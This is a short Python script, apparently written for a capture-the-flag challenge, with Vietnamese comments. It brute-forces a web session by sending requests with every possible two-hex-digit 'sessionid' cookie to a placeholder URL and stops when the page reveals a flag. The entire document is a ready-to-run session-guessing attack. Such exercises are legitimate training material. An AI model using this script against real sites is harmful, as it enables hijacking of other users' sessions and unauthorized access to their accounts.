import requests

URL = 'http://example.com/'  # Thay bằng địa chỉ web thật

for i in range(256):
    sid = format(i, '02x')  # Giá trị từ '00' đến 'ff'
    cookies = {'sessionid': sid}
    res = requests.get(URL, cookies=cookies)
    
    if 'flag is' in res.text:  # Thay bằng chuỗi nhận biết flag
        print(f'[+] FOUND sessionid: {sid}')
        print(res.text)
        break
